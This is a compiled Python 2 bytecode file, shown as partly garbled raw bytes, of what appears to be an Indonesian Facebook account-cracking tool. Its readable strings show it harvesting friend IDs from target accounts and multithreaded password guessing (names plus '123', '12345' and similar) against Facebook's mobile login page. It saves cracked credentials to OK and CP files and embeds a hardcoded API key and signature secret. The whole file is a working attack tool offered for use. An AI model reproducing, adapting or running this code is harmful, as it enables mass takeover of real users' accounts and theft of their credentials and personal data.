# -*- coding: utf-8
�
,��`c           @   s  d  Z  d Z d Z d Z d Z d Z d Z d Z e  d Z e  d	 e d
 Z	 e  d e d Z
 e  d
 e d Z e  d e d Z e  d e d Z
 e  d e d Z e  d Z y� d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l m Z d d l m Z d d l m Z d d l  m  Z  Wn" e! k
 r�Z" d GHe# d � n Xe$ e � e j% d � d  Z  d Z d Z d Z d Z d Z d Z d Z y e j& d � Wn n Xd  a' g  Z( g  Z) g  Z* g  Z+ e j, �  Z- e j. d! d" d# d$ d% d& d' d g � Z/ d( Z0 e- j1 d) � j2 Z3 d* �  Z4 e  j5 �  Z6 e6 j7 Z8 d+ d, d- d. d/ d0 d1 d2 d3 d4 d5 d6 g Z9 y0 e8 d  k  s�e8 d7 k r�e# �  n  e8 d8 Z: Wn e; k
 r�e# �  n Xe  j5 �  Z< e< j= Z> e< j7 Z? e< j@ ZA e9 e: ZB d9 �  ZC d: �  ZD d; �  ZE d< �  ZF d= �  ZG d> �  ZH d? �  ZI d@ �  ZJ dA �  ZK dB �  ZL dC �  ZM dD �  ZN dE �  ZO dF �  ZP eQ dG k re jR d  dH k r�dI e jR d  dJ !k r�dI n dK ZS n
 e# dL � e jT dM � eF �  n  d S(N   s   [1;91ms   [1;97ms   [1;92ms   [1;96ms   [1;94ms   [1;93ms   [4ms   [0ms    ___ s   / x )s     Recode by Titid Langka s   (_,_/\ s
       ________ s    \    \ s     \⧹ tytyd ⧹\ s	     \    \ s     \⧹ crack ⧹\ s     _\    \__s    \⧹ efbeh ⧹\ s    (         )s     ¯¯¯¯¯¯¯¯ s
     \___\___/ 
i����N(   t   Browser(   t
   ThreadPool(   t   ConnectionError(   t   datetimes;    [0;97m[[0;91m![0;97m] Module requests not installed yets=    [0;97m[[0;93m#[0;97m] Please Type : pip2 install requestst   utf8s   .texti    s   [0;91ms   [0;92ms   [0;93ms   [0;94ms   [0;95ms   [0;96ms   [0;97ms{   NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+s.   https://api-asutoolkit.cloudaccess.host/ip.phpc         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g�������?(   t   syst   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   61.pyt   jalanG   s    
t   Januarit   Februarit   Marett   Aprilt   Meit   Junit   Julit   Agustust	   Septembert   Oktobert   Nopembert   Desemberi   i   c           C   s   d GHt  j d � d  S(   Ns   yang bener kontoli   (   R	   R
   (    (    (    s   61.pyt   salah\   s    c           C   s,   t  GHt GHt GHt GHt GHt GHt GHt GHd  S(   N(   t   awewet   bwewet   cwewet   dwewet   ewewet   fwewet   gwewet   hwewe(    (    (    s   61.pyt   logo_   s    c          C   sJ   y t  d d � j �  }  Wn# t k
 r> d GHt j d � n Xt �  d  S(   Ns	   login.txtt   rs'    [0;97m[[0;91m![0;97m] Token Invalids   rm -rf login.txt(   t   opent   readt   IOErrort   ost   systemt   menu(   t   token(    (    s   61.pyt	   bot_komenj   s    
c          C   s�   t  j d � y t d d � }  t �  Wn� t t f k
 r� t �  d GHd GHd GHd GHt d � } | d	 k rz t �  q� | d
 k s� | d k r� t	 �  q� | d k s� | d
 k r� t
 �  q� | d k s� | d k r� t �  q� t �  n Xd  S(   Nt   clears	   login.txtR$   s   
>_Select The Login Method s   >_1 login token facebooks   >_2 login cookies facebooks)   >_3 login menggunakan username / passwords   
>_select : t    t   1t   01t   2t   02t   3t   03(   R(   R)   R%   R*   t   KeyErrorR'   R#   t	   raw_inputt   logint   tokenzt   cookiet   login2(   R+   t   ask(    (    s   61.pyR7   �   s(    




c          C   s  t  �  t d � }  y� t j d d i	 d d 6d d 6d d	 6d
 d 6d d
 6d d 6d d 6d d 6d d 6d i |  d 6�} t j d | j � } | d  k r� d n d | j d � } Wn t j	 j
 k
 r� d GHn Xt d d � }  |  j | j d � � |  j
 �  t �  d  S(   Ns/    [0;97m[[0;92m+[0;97m] Your Cookie : [0;96msG   https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_t   headerss�   Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36s
   user-agents   https://m.facebook.com/t   referers   m.facebook.comt   hosts   https://m.facebook.comt   originR/   s   upgrade-insecure-requestss#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages	   max-age=0s
   cache-controlsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8t   accepts   text/html; charset=utf-8s   content-typet   cookiesR9   s	   (EAAA\w+)s-    [0;97m[[0;91m![0;97m] Your Cookie Invalids   
>_Your fb access token : i   s'    [0;97m[[0;91m![0;97m] No Connections	   login.txtt   w(   R#   R6   t   requestst   gett   ret   searcht   textt   Nonet   groupt
   exceptionsR   R%   R   t   closeR,   (   R9   t   datat
   find_tokent   hasil(    (    s   61.pyR9   �   s.    

)	
c          C   s�   t  j d � y t d d � }  t �  Wn� t t f k
 r� t �  t d � }  yV t j	 d |  � } t
 j | j � } t d d � } | j
 |  � | j �  t �  Wq� t k
 r� t d � q� Xn Xd  S(   NR-   s	   login.txtR$   s
   >_token : s+   https://graph.facebook.com/me?access_token=RB   s'    [0;97m[[0;91m![0;97m] Token Invalid(   R(   R)   R%   R*   R5   R'   R#   R6   RC   RD   t   jsont   loadsRG   R   RK   R,   t   exit(   R+   t   otwt   at   avsid(    (    s   61.pyR8   �   s     



c          C   s�  t  j d � y t d d � }  t �  Wn�t t f k
 r�t  j d � t �  d GHt d � } t j d � } y t	 j d � Wn  t
 j k
 r� d GHt �  n Xt
 t	 j _ t	 j d	 d
 � | t	 j d <| t	 j d <t	 j �  t	 j �  } d
 | k rNy(d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d d 6d  d! 6} t j d" � } | j | � | j �  } | j i | d# 6� d$ } t j | d% | �} t j | j � }	 t d d& � }
 |
 j |	 d' � |
 j �  d( GHt j d) |	 d' � t  �  t �  WqNt j! j" k
 rJd GHt �  qNXn  d* | k r�d+ GHd, GHt  j d- � t# j$ d. � t �  q�d/ GHt  j d- � t# j$ d. � t% �  n Xd  S(0   NR-   s	   login.txtR$   sQ     [0;97m[[0;93m*[0;97m] gunakan vpn brazil atau ukraina agar tidak chekpoint

s%     [0;97m[[0;93m*[0;97m] Username: s$     [0;97m[[0;93m*[0;97m] Password s   https://m.facebook.coms   
  [1;91m[!] No connectiont   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatR/   t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsRB   t   access_tokens5   
  [1;91m[[1;96m![1;91m] [1;92mLogin successfullysM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=t
   checkpoints'   
  [1;91m[!] [1;93mAccount Checkpoints!   
  [1;92m[#] Harap Login Ulang !s   rm -rf login.txti   s   
  [1;91m[!] Login gagal(&   R(   R)   R%   R*   R5   R'   R#   R6   t   getpasst   brt	   mechanizet   URLErrort   keluart   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestRC   RD   RO   RP   RG   R   RK   t   postt   bot_komeRJ   R   R	   R
   R:   (   t   tokett   idt   pwdt   urlRg   RL   t   xRS   R$   R   t   zedd(    (    s   61.pyR:   �   sh    




S






c          C   s�  y t  d d � j �  a Wn7 t k
 rR d GHt j d � t j d � t �  n Xy= t j d t � }  t	 j
 |  j � } | d } | d } WnW t k
 r� t j d � d GHt j d � t �  n! t j
 j k
 r� t d	 � n Xt �  t d
 t d t d GHd
 t | GHd t t GHd GHd GHd GHd GHd GHd GHt d � } | d k rkt �  t �  n� | d k s�| d k r�t �  n� | d k s�| d k r�t �  n� | d k s�| d k r�t �  nk | d k s�| d k r�t �  nI | d k s| d  k rt �  n' | d! k s-| d" k r<t d# � } n  | d k rYt �  t �  nh | d$ k sq| d% k r�t j d& � t �  n9 | d' k s�| d( k r�t j d) � t d* � n t �  d  S(+   Ns	   login.txtR$   s'    [0;97m[[0;91m![0;97m] Token InvalidR-   s   rm -rf login.txts,   https://graph.facebook.com/me/?access_token=t   nameR~   s'    [0;97m[[0;91m![0;97m] No Connections	   warning :s     metode crack menggunakan metodes    mbasics   [0;97m>_account name : s   [0;97m>_current ip  : s   
[0;97m>_ 1 crack 1 id publiks   >_[0;97m 2 crack 2 id publik s   >_[0;97m 3 crack 3 id publik s   >_[0;97m 4 crack 4 id publik s   >_[0;97m 5 crack 5 id publik s"   >_[0;97m 0 logout token or cookies   
>_pilih : R.   R/   R0   R1   R2   R3   R4   t   4t   04t   5t   05Rc   t   00s*   
>_apakah anda ingin logout account Y/n : t   Nt   ng{�G�z�?t   Yt   ys   rm -f login.txts'    [0;97m[[0;96m#[0;97m] Token Deleted(    R%   R&   R+   R'   R(   R)   R7   RC   RD   RO   RP   RG   R5   RJ   R   RQ   R#   t   mt   kt   ht   ut   ipR6   R   R*   t   publict   public2t   public3t   public4t   pub5R	   R
   (   RR   RS   t   namaR~   R;   (    (    s   61.pyR*   �   sn    




















c    
      C   s�  y t  d d � j �  a Wn t k
 r8 d GHt �  n Xd GHt t d t d t � }  y� t j	 d |  d t � } t
 j | j � } t  d	 d
 � } xT | d D]H } | d } | d
 } | j
 | d | d � t j | d | � q� W| j �  Wn! t t f k
 rt d � n Xd t t t � � GHt d � } | d k sX| d k rbt �  n  d t t t f GHd t t t f GHd �  } t d � }	 |	 j | t � t d � d  S(   Ns	   login.txtR$   s'    [0;97m[[0;91m![0;97m] Token InvalidsG   
[0;97m>_ketik '[31;1mme[0;97m' jika ingin mengambil id friends lists   >_ user id target s   : s   https://graph.facebook.com/s   /friends?access_token=s   .texts   a+b+wRL   R~   R�   s   <(+)>s   
s   *[31;1m   not found!!s   [0;97m>_total id : [0;91ms   
*[0;97m sandi manual ? y/t : R�   R�   sC   [0;97m>_ hasil[32;1m ok[0;97m tersimpan di : out/OK-%s-%s-%s.txtsD   [0;97m>_ hasil[33;1m cp[0;97m tersimpan di : out/CP-%s-%s-%s.txt
c   
   	   S   s  g  } t  j j d t t t t � t t � t t � f � t  j j	 �  |  j
 d � \ } } x| j
 d � D]� } t | � d k  r� qm qm t | � d k r� t | � d k r� t | � d k r� t | � d k s� t | � d k r=| j | d	 � | j | d
 � | j | d � | j | d � | j | d
 � qm | j | d
 � | j | d � qm Wy�x�| D]�} | j �  } t
 j d d i | d 6| d 6d d 6d i t d 6�} | j } d | k s�d | k rWd | d | d GHt j | d | � t d t t t f d � } | j d t | � d t | � d � | j �  Pqmn  d | k rmy� t d  � j �  a d! | d" t }	 t j |	 � j �  }
 |
 d# j d$ d% � } |
 d& } d' | d | d | GHt j | d | d | � t d( t t t f d � } | j d t | � d t | � d | d � | j �  PWn# t t f k
 rmd } n n Xd' | d | d GHt j | d | � t d( t t t f d � } | j d t | � d t | � d � | j �  PqmqmqmWt d 7a Wn n Xd  S()   Ns3   
[0;97m%s>_[0;97m cracking %s/%s OK-:%s - CP-:%s s   <(+)>t    i   i   i   i   i   t   12t   123t   1234t   12345t   789s%   https://mbasic.facebook.com/login.phpRL   RV   RW   Ru   R7   R<   s
   user-agentt   mbasic_logout_buttons   save-devices   
 [0;92m>_ t   |s          s   out/OK-%s-%s-%s.txtRS   s     >_ s   
Rj   s	   login.txts   https://graph.facebook.com/s   ?access_token=t   birthdayt   /t   -R�   s   
 [0;93m>_ s   out/CP-%s-%s-%s.txt(   R   R   R   t   rgbt   loopt   lenR~   t   okt   cpR   t   splitt   appendt   lowerRC   R{   t   uat   contentR%   t   hat   opt   tat   strRK   R&   R+   t   sRD   RO   t   replaceR5   R'   (
   t   usert   pwxt   uidR�   t   sst   pwt   rext   xot   saveR�   RL   t   ttlR�   (    (    s   61.pyt   mainW  sp    	,
Z
7	)

1
	 )

i   s%   
 [0;97m[[0;96m√[0;97m] Finished(   R%   R&   R+   R'   R8   R6   R�   R�   RC   RD   RO   RP   RG   R   R~   R�   RK   R5   RQ   R�   R�   t   manualR�   R�   R�   R   t   map(
   t   idtR$   t   jt   tidRS   t   ngentodt   tanteR;   R�   t   p(    (    s   61.pyR�   9  s:    



	<c          C   s�  y t  d d � j �  a Wn t k
 r8 d GHt �  n Xt t d t d t � }  t t d t d t � } y� t j	 d |  d t � } t
 j | j � } t  d	 d
 � } xT | d D]H } | d } | d
 } | j
 | d | d � t j | d | � q� W| j �  Wn! t t f k
 r5t d � n Xy� t j	 d | d t � } t
 j | j � } t  d	 d
 � } xT | d D]H } | d } | d
 } | j
 | d | d � t j | d | � q�W| j �  Wn! t t f k
 r�t d � n Xd t t t � � GHt d � } | d k s4| d k r>t �  n  d t t t f GHd t t t f GHd �  }	 t d � }
 |
 j |	 t � t d � d  S(   Ns	   login.txtR$   s'    [0;97m[[0;91m![0;97m] Token Invalids   >_ user id target ke - 1 s   : s   >_ user id target ke - 2 s   https://graph.facebook.com/s   /friends?access_token=s   .texts   a+b+wRL   R~   R�   s   <(+)>s   
s   *[31;1m   not found!!s   [0;97m>_total id : [0;91ms   
*[0;97m sandi manual y/t : R�   R�   sB   [0;97m>_hasil[32;1m ok[0;97m tersimpan di : out/OK-%s-%s-%s.txtsC   [0;97m>_hasil[33;1m cp[0;97m tersimpan di : out/CP-%s-%s-%s.txt
c   
   	   S   s  g  } t  j j d t t t t � t t � t t � f � t  j j	 �  |  j
 d � \ } } x| j
 d � D]� } t | � d k  r� qm qm t | � d k r� t | � d k r� t | � d k r� t | � d k s� t | � d k r=| j | d	 � | j | d
 � | j | d � | j | d � | j | d
 � qm | j | d
 � | j | d � qm Wy�x�| D]�} | j �  } t
 j d d i | d 6| d 6d d 6d i t d 6�} | j } d | k s�d | k rWd | d | d GHt j | d | � t d t t t f d � } | j d t | � d t | � d � | j �  Pqmn  d | k rmy� t d  � j �  a d! | d" t }	 t j |	 � j �  }
 |
 d# j d$ d% � } |
 d& } d' | d | d | GHt j | d | d | � t d( t t t f d � } | j d t | � d t | � d | d � | j �  PWn# t t f k
 rmd } n n Xd' | d | d GHt j | d | � t d( t t t f d � } | j d t | � d t | � d � | j �  PqmqmqmWt d 7a Wn n Xd  S()   Ns2   
[0;97m%s*[0;97m cracking %s/%s OK-:%s - CP-:%s s   <(+)>R�   i   i   i   i   i   R�   R�   R�   R�   R�   s%   https://mbasic.facebook.com/login.phpRL   RV   RW   Ru   R7   R<   s
   user-agentR�   s   save-devices   
 [0;92m>_ R�   s          s   out/OK-%s-%s-%s.txtRS   s     >_ s   
Rj   s	   login.txts   https://graph.facebook.com/s   ?access_token=R�   R�   R�   R�   s   
 [0;93m>_ s   out/CP-%s-%s-%s.txt(   R   R   R   R�   R�   R�   R~   R�   R�   R   R�   R�   R�   RC   R{   R�   R�   R%   R�   R�   R�   R�   RK   R&   R+   R�   RD   RO   R�   R5   R'   (
   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   RL   R�   R�   (    (    s   61.pyR�   �  sp    	,
Z
7	)

1
	 )

i   s%   
 [0;97m[[0;96m√[0;97m] Finished(   R%   R&   R+   R'   R8   R6   R�   R�   RC   RD   RO   RP   RG   R   R~   R�   RK   R5   RQ   R�   R�   R�   R�   R�   R�   R   R�   (   R�   t   idt2R$   R�   R�   RS   R�   R�   R;   R�   R�   (    (    s   61.pyR�   �  sR    





	<c             s�   d GHt  d � �  d �  GHt �  � d k r9 t d � n  d t t t f GHd t t t f GH�  f d �  }  t d	 � } | j |  t � t d
 � d  S(   Ns-   [0;97m>_example pass : tytydku, kurang,besars   [0;97m>_type password : s'   
[0;97m>_ current password : [0;91m%si    s    [0;97m>_don't be emptys@   [0;97m>_account [0;92mok[0;97m saved In : out/ok-%s-%s-%s.txtsB   [0;97m>_hasil[33;1mcp[0;97m tersimpan di : out/cp-%s-%s-%s.txt
c      	      s)  t  j j d t t t � t t � t t � f � t  j j �  |  j	 d � \ } } | j	 d � } y t
 j d � Wn t k
 r� n Xy�x��  j	 d � D]q} t
 j d d i | d 6| d	 6d
 d 6d i t d
 6�} | j } d | k s� d | k ryd | d | d GHt j | d | � t d t t t f d � } | j d t | � d t | � d � | j �  Pq� n  d | k r� y� t d � j �  a d | d t } t j | � j �  }	 |	 d j d d � }
 d | d | d |
 GHt j | d | d |
 � t d t t t f d � } | j d t | � d t | � d |
 d � | j �  PWn# t t f k
 r�d }
 n n Xd | d | d GHt j | d | � t d t t t f d � } | j d t | � d t | � d � | j �  Pq� q� q� Wt d  7a Wn n Xd  S(!   Ns8   
 [0;97m[0;93m*[0;97m cracking %s/%s OK-:%s - CP-:%s s   <(+)>R�   t   outt   ,s%   https://mbasic.facebook.com/login.phpRL   RV   RW   Ru   R7   R<   s
   user-agentR�   s   save-devices   
 [0;92m>_ R�   s          s   out/OK-%s-%s-%s.txtRS   s     >_ s   
Rj   s	   login.txts   https://graph.facebook.com/s   ?access_token=R�   R�   R�   s   
 [0;93m>_ s   out/CP-%s-%s-%s.txti   (    R   R   R   R�   R�   R~   R�   R�   R   R�   R(   t   mkdirt   OSErrorRC   R{   R�   R�   R�   R%   R�   R�   R�   R�   RK   R&   R+   R�   RD   RO   R�   R5   R'   (   R�   R�   R�   R�   t   asuR�   R�   R�   R�   RL   R�   (   R�   (    s   61.pyR�     s\    2

7	)
1
	 )

i   s#   
 [0;97m[[0;96m#[0;97m] Finished(	   R6   R�   RQ   R�   R�   R�   R   R�   R~   (   R�   R�   (    (   R�   s   61.pyR�     s    	
0c          C   sv  y t  d d � j �  a Wn t k
 r8 d GHt �  n Xt t d t d t � }  t t d t d t � } t t d t d t � } y� t j	 d |  d	 t � } t
 j | j � } t  d
 d � } xT | d D]H } | d
 } | d } | j
 | d | d � t j | d | � q� W| j �  Wn! t t f k
 rQt d � n Xy� t j	 d | d	 t � } t
 j | j � } t  d
 d � } xT | d D]H } | d
 } | d } | j
 | d | d � t j | d | � q�W| j �  Wn! t t f k
 rt d � n Xy� t j	 d | d	 t � } t
 j | j � } t  d
 d � } xT | d D]H } | d
 } | d } | j
 | d | d � t j | d | � qaW| j �  Wn! t t f k
 r�t d � n Xd t t t � � GHt d � }	 |	 d k s|	 d k rt �  n  d t t t f GHd t t t f GHd �  }
 t d � } | j |
 t � t d � d  S(   Ns	   login.txtR$   s'    [0;97m[[0;91m![0;97m] Token Invalids   >_ user id target ke - 1 s   : s   >_ user id target ke - 2 s   >_ user id target ke - 3 s   https://graph.facebook.com/s   /friends?access_token=s   .texts   a+b+wRL   R~   R�   s   <(+)>s   
s   *[31;1m   not found!!s   [0;97m>_total id : [0;91ms   
*[0;97m sandi manual y/t : R�   R�   sB   [0;97m>_hasil[32;1m ok[0;97m tersimpan di : out/OK-%s-%s-%s.txtsC   [0;97m>_hasil[33;1m cp[0;97m tersimpan di : out/CP-%s-%s-%s.txt
c   
   	   S   s  g  } t  j j d t t t t � t t � t t � f � t  j j	 �  |  j
 d � \ } } x| j
 d � D]� } t | � d k  r� qm qm t | � d k r� t | � d k r� t | � d k r� t | � d k s� t | � d k r=| j | d	 � | j | d
 � | j | d � | j | d � | j | d
 � qm | j | d
 � | j | d � qm Wy�x�| D]�} | j �  } t
 j d d i | d 6| d 6d d 6d i t d 6�} | j } d | k s�d | k rWd | d | d GHt j | d | � t d t t t f d � } | j d t | � d t | � d � | j �  Pqmn  d | k rmy� t d  � j �  a d! | d" t }	 t j |	 � j �  }
 |
 d# j d$ d% � } |
 d& } d' | d | d | GHt j | d | d | � t d( t t t f d � } | j d t | � d t | � d | d � | j �  PWn# t t f k
 rmd } n n Xd' | d | d GHt j | d | � t d( t t t f d � } | j d t | � d t | � d � | j �  PqmqmqmWt d 7a Wn n Xd  S()   Ns2   
[0;97m%s*[0;97m cracking %s/%s OK-:%s - CP-:%s s   <(+)>R�   i   i   i   i   i   R�   R�   R�   R�   R�   s%   https://mbasic.facebook.com/login.phpRL   RV   RW   Ru   R7   R<   s
   user-agentR�   s   save-devices   
 [0;92m>_ R�   s          s   out/OK-%s-%s-%s.txtRS   s     >_ s   
Rj   s	   login.txts   https://graph.facebook.com/s   ?access_token=R�   R�   R�   R�   s   
 [0;93m>_ s   out/CP-%s-%s-%s.txt(   R   R   R   R�   R�   R�   R~   R�   R�   R   R�   R�   R�   RC   R{   R�   R�   R%   R�   R�   R�   R�   RK   R&   R+   R�   RD   RO   R�   R5   R'   (
   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   RL   R�   R�   (    (    s   61.pyR�   �  sp    	,
Z
7	)

1
	 )

i   s%   
 [0;97m[[0;96m√[0;97m] Finished(   R%   R&   R+   R'   R8   R6   R�   R�   RC   RD   RO   RP   RG   R   R~   R�   RK   R5   RQ   R�   R�   R�   R�   R�   R�   R   R�   (   R�   R�   t   idt3R$   R�   R�   RS   R�   R�   R;   R�   R�   (    (    s   61.pyR�   E  sl    







	<c    
      C   sW  y t  d d � j �  a Wn t k
 r8 d GHt �  n Xt t d t d t � }  t t d t d t � } t t d t d t � } t t d t d t � } y� t j	 d	 |  d
 t � } t
 j | j � } t  d d � } xT | d
 D]H } | d } | d }	 | j
 | d |	 d � t j | d |	 � q� W| j �  Wn! t t f k
 rmt d � n Xy� t j	 d	 | d
 t � } t
 j | j � } t  d d � } xT | d
 D]H } | d } | d }	 | j
 | d |	 d � t j | d |	 � q�W| j �  Wn! t t f k
 r2t d � n Xy� t j	 d	 | d
 t � } t
 j | j � } t  d d � } xT | d
 D]H } | d } | d }	 | j
 | d |	 d � t j | d |	 � q}W| j �  Wn! t t f k
 r�t d � n Xy� t j	 d	 | d
 t � } t
 j | j � } t  d d � } xT | d
 D]H } | d } | d }	 | j
 | d |	 d � t j | d |	 � qBW| j �  Wn! t t f k
 r�t d � n Xd t t t � � GHt d � }
 |
 d k s�|
 d k r t �  n  d t t t f GHd t t t f GHd �  } t d � } | j | t � t d � d  S(   Ns	   login.txtR$   s'    [0;97m[[0;91m![0;97m] Token Invalids   >_ user id target ke - 1 s   : s   >_ user id target ke - 2 s   >_ user id target ke - 3 s   >_ user id target ke - 4 s   https://graph.facebook.com/s   /friends?access_token=s   .texts   a+b+wRL   R~   R�   s   <(+)>s   
s   *[31;1m   not found!!s   [0;97m>_total id : [0;91ms   
*[0;97m sandi manual y/t : R�   R�   sB   [0;97m>_hasil[32;1m ok[0;97m tersimpan di : out/OK-%s-%s-%s.txtsC   [0;97m>_hasil[33;1m cp[0;97m tersimpan di : out/CP-%s-%s-%s.txt
c   
   	   S   s  g  } t  j j d t t t t � t t � t t � f � t  j j	 �  |  j
 d � \ } } x| j
 d � D]� } t | � d k  r� qm qm t | � d k r� t | � d k r� t | � d k r� t | � d k s� t | � d k r=| j | d	 � | j | d
 � | j | d � | j | d � | j | d
 � qm | j | d
 � | j | d � qm Wy�x�| D]�} | j �  } t
 j d d i | d 6| d 6d d 6d i t d 6�} | j } d | k s�d | k rWd | d | d GHt j | d | � t d t t t f d � } | j d t | � d t | � d � | j �  Pqmn  d | k rmy� t d  � j �  a d! | d" t }	 t j |	 � j �  }
 |
 d# j d$ d% � } |
 d& } d' | d | d | GHt j | d | d | � t d( t t t f d � } | j d t | � d t | � d | d � | j �  PWn# t t f k
 rmd } n n Xd' | d | d GHt j | d | � t d( t t t f d � } | j d t | � d t | � d � | j �  PqmqmqmWt d 7a Wn n Xd  S()   Ns2   
[0;97m%s*[0;97m cracking %s/%s OK-:%s - CP-:%s s   <(+)>R�   i   i   i   i   i   R�   R�   R�   R�   R�   s%   https://mbasic.facebook.com/login.phpRL   RV   RW   Ru   R7   R<   s
   user-agentR�   s   save-devices   
 [0;92m>_ R�   s          s   out/OK-%s-%s-%s.txtRS   s     >_ s   
Rj   s	   login.txts   https://graph.facebook.com/s   ?access_token=R�   R�   R�   R�   s   
 [0;93m>_ s   out/CP-%s-%s-%s.txt(   R   R   R   R�   R�   R�   R~   R�   R�   R   R�   R�   R�   RC   R{   R�   R�   R%   R�   R�   R�   R�   RK   R&   R+   R�   RD   RO   R�   R5   R'   (
   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   RL   R�   R�   (    (    s   61.pyR�   
  sp    	,
Z
7	)

1
	 )

i   s%   
 [0;97m[[0;96m√[0;97m] Finished(   R%   R&   R+   R'   R8   R6   R�   R�   RC   RD   RO   RP   RG   R   R~   R�   RK   R5   RQ   R�   R�   R�   R�   R�   R�   R   R�   (
   R�   R�   R�   t   idt4R$   R�   R�   RS   R�   R�   R;   R�   R�   (    (    s   61.pyR�   �  s�    









	<c          C   s8  y t  d d � j �  a Wn t k
 r8 d GHt �  n Xt t d t d t � }  t t d t d t � } t t d t d t � } t t d t d t � } t t d	 t d t � } y� t j	 d
 |  d t � } t
 j | j � } t  d d
 � } xT | d D]H } | d }	 | d }
 | j
 |	 d |
 d � t j |	 d |
 � qW| j �  Wn! t t f k
 r�t d � n Xy� t j	 d
 | d t � } t
 j | j � } t  d d
 � } xT | d D]H } | d }	 | d }
 | j
 |	 d |
 d � t j |	 d |
 � q�W| j �  Wn! t t f k
 rNt d � n Xy� t j	 d
 | d t � } t
 j | j � } t  d d
 � } xT | d D]H } | d }	 | d }
 | j
 |	 d |
 d � t j |	 d |
 � q�W| j �  Wn! t t f k
 rt d � n Xy� t j	 d
 | d t � } t
 j | j � } t  d d
 � } xT | d D]H } | d }	 | d }
 | j
 |	 d |
 d � t j |	 d |
 � q^W| j �  Wn! t t f k
 r�t d � n Xy� t j	 d
 | d t � } t
 j | j � } t  d d
 � } xT | d D]H } | d }	 | d }
 | j
 |	 d |
 d � t j |	 d |
 � q#W| j �  Wn! t t f k
 r�t d � n Xd t t t � � GHt d � } | d k s�| d k r�t �  n  d t t t f GHd t t t f GHd �  } t d � }
 |
 j | t � t d � d  S(   Ns	   login.txtR$   s'    [0;97m[[0;91m![0;97m] Token Invalids   >_ user id target ke - 1 s   : s   >_ user id target ke - 2 s   >_ user id target ke - 3 s   >_ user id target ke - 4 s   >_ user id target ke - 5 s   https://graph.facebook.com/s   /friends?access_token=s   .texts   a+b+wRL   R~   R�   s   <(+)>s   
s   *[31;1m   not found!!s   [0;97m>_total id : [0;91ms   
*[0;97m sandi manual y/t : R�   R�   sB   [0;97m>_hasil[32;1m ok[0;97m tersimpan di : out/OK-%s-%s-%s.txtsC   [0;97m>_hasil[33;1m cp[0;97m tersimpan di : out/CP-%s-%s-%s.txt
c   
   	   S   s  g  } t  j j d t t t t � t t � t t � f � t  j j	 �  |  j
 d � \ } } x| j
 d � D]� } t | � d k  r� qm qm t | � d k r� t | � d k r� t | � d k r� t | � d k s� t | � d k r=| j | d	 � | j | d
 � | j | d � | j | d � | j | d
 � qm | j | d
 � | j | d � qm Wy�x�| D]�} | j �  } t
 j d d i | d 6| d 6d d 6d i t d 6�} | j } d | k s�d | k rWd | d | d GHt j | d | � t d t t t f d � } | j d t | � d t | � d � | j �  Pqmn  d | k rmy� t d  � j �  a d! | d" t }	 t j |	 � j �  }
 |
 d# j d$ d% � } |
 d& } d' | d | d | GHt j | d | d | � t d( t t t f d � } | j d t | � d t | � d | d � | j �  PWn# t t f k
 rmd } n n Xd' | d | d GHt j | d | � t d( t t t f d � } | j d t | � d t | � d � | j �  PqmqmqmWt d 7a Wn n Xd  S()   Ns2   
[0;97m%s*[0;97m cracking %s/%s OK-:%s - CP-:%s s   <(+)>R�   i   i   i   i   i   R�   R�   R�   R�   R�   s%   https://mbasic.facebook.com/login.phpRL   RV   RW   Ru   R7   R<   s
   user-agentR�   s   save-devices   
 [0;92m>_ R�   s          s   out/OK-%s-%s-%s.txtRS   s     >_ s   
Rj   s	   login.txts   https://graph.facebook.com/s   ?access_token=R�   R�   R�   R�   s   
 [0;93m>_ s   out/CP-%s-%s-%s.txt(   R   R   R   R�   R�   R�   R~   R�   R�   R   R�   R�   R�   RC   R{   R�   R�   R%   R�   R�   R�   R�   RK   R&   R+   R�   RD   RO   R�   R5   R'   (
   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   RL   R�   R�   (    (    s   61.pyR�   �  sp    	,
Z
7	)

1
	 )

i   s%   
 [0;97m[[0;96m√[0;97m] Finished(   R%   R&   R+   R'   R8   R6   R�   R�   RC   RD   RO   RP   RG   R   R~   R�   RK   R5   RQ   R�   R�   R�   R�   R�   R�   R   R�   (   R�   R�   R�   R�   t   idt5R$   R�   R�   RS   R�   R�   R;   R�   R�   (    (    s   61.pyR�   J  s�    











	<t   __main__R3   s   2.7i   s   2.8s7    [0;97m[[0;91m![0;97m] How To Usage : python2 run.pys   git pull(U   R�   R�   R�   t   bR�   R�   t   ult   noR   R   R   R   R   R    R!   R"   RC   R   R(   t
   subprocesst   randomR	   RE   RO   t   uuidRk   Rm   R    t   multiprocessing.poolR   t   requests.exceptionsR   R   t	   Exceptiont   modulRQ   t   reloadt   setdefaultencodingt   removeR�   R�   R�   R~   R�   t   SessionR�   t   choiceR�   R�   RD   RG   R�   R
   t   nowt   ctt   monthR�   t   bulant   nTempt
